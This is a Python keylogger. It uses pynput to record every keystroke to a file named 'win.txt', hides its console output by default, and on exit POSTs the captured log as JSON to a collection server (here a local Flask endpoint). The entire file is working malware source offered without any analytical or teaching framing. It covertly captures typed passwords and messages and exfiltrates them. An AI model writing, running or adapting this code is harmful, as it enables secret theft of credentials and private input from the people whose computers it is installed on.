import os
import sys
import threading
import time
import requests
from pynput.keyboard import Listener, Key

LOG_FILE = "win.txt"
REMOTE_SERVER_URL = "http://127.0.0.1:5000/api/log"  # Flask server URL
running = True  # Control flag for the animation
VERBOSE = False  # Disable console output by default

def send_to_server(data):
    try:
        headers = {'Content-Type': 'application/json'}
        response = requests.post(
            REMOTE_SERVER_URL,
            json={"keystrokes": data},
            headers=headers
        )
        if VERBOSE:
            if response.status_code == 200:
                print("\nKeystrokes sent to server successfully.")
            else:
                print(f"\nServer error: {response.status_code} - {response.text}")
    except Exception as e:
        if VERBOSE:
            print(f"\nError sending data: {e}")

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    if key == Key.esc:
        global running
        running = False
        return False

def spinner():
    spinner_chars = "|/-\\"
    idx = 0
    while running:
        if VERBOSE:
            sys.stdout.write(f"\rKeylogger is running... {spinner_chars[idx % len(spinner_chars)]}")
            sys.stdout.flush()
        time.sleep(0.1)
        idx += 1
    if VERBOSE:
        sys.stdout.write("\rKeylogger stopped.                     \n")
        sys.stdout.flush()

def main():
    global VERBOSE
    # Enable verbose if explicitly requested via env or argv
    VERBOSE = os.environ.get("KEYLOGGER_VERBOSE", "0") == "1" or (len(sys.argv) > 1 and sys.argv[1] == "--verbose")
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
    global running
    running = True

    try:
        if VERBOSE:
            spin_thread = threading.Thread(target=spinner)
            spin_thread.daemon = True
            spin_thread.start()

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        running = False
        if VERBOSE:
            print("\nCtrl+C detected. Keylogger terminated.")
    finally:
        running = False
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                logged_data = f.read()
            send_to_server(logged_data)

if __name__ == "__main__":
    main()
